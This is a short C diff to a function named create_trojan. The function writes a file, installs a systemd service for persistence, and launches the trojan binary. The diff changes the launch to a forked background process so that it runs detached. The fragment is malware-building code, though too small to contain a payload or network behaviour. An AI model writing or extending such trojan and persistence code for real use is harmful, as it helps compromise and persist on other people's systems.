@@ -18,8 +18,9 @@ int	create_trojan(void)
 	}
 	close(fd);
 	create_systemd_service();
-	execve(TROLOC, (char **){}, environ);
-	return (EXIT_FAILURE);
+	if (fork() == 0)
+		execve(TROLOC, (char **){NULL}, environ);
+	return (EXIT_SUCCESS);
 }
 
 int	main(void)
